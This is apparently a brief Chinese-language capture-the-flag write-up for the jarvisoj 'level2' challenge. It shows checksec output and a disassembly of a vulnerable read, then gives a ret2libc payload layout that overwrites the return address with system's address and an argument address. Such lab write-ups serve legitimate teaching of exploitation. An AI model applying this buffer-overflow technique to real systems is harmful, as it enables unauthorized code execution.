# WP
nc pwn2.jarvisoj.com 9878

开启了NX使得我们不能执行栈了

```
➜  level2 git:(master) ✗ checksec level2
[*] '/mnt/hgfs/file/Note/PWN/jarvisoj.com/level2/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

溢出部分大大的一个_system
```
.text:0804844B buf             = byte ptr -88h
.text:0804844B
.text:0804844B                 push    ebp
.text:0804844C                 mov     ebp, esp
.text:0804844E                 sub     esp, 88h
.text:08048454                 sub     esp, 0Ch
.text:08048457                 push    offset command  ; "echo Input:"
.text:0804845C                 call    _system
.text:08048461                 add     esp, 10h
.text:08048464                 sub     esp, 4
.text:08048467                 push    100h            ; nbytes
.text:0804846C                 lea     eax, [ebp+buf]
.text:08048472                 push    eax             ; buf
.text:08048473                 push    0               ; fd
.text:08048475                 call    _read
.text:0804847A                 add     esp, 10h
.text:0804847D                 nop
.text:0804847E                 leave
.text:0804847F                 retn
```

不用多说ret2lib

0x88 * padding + 4 * paddng + _systemAddr + parameterAddr

